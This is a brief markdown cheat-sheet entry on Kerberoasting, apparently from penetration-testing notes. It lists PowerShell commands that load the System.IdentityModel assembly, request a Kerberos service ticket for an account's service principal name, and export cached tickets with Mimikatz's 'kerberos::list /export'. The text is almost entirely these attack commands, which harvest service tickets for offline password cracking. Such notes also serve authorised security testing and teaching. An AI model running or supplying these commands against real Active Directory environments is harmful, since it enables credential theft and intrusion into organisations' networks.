## Kerberoasting
- First find the user with SPN enabled
```
Add-Type -AssemblyName system.IdentityModel
```
```
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "SPN(service principal name)of user"
```
```
Invoke-Mimikatz -Command '"kerberos::list /export"'
```
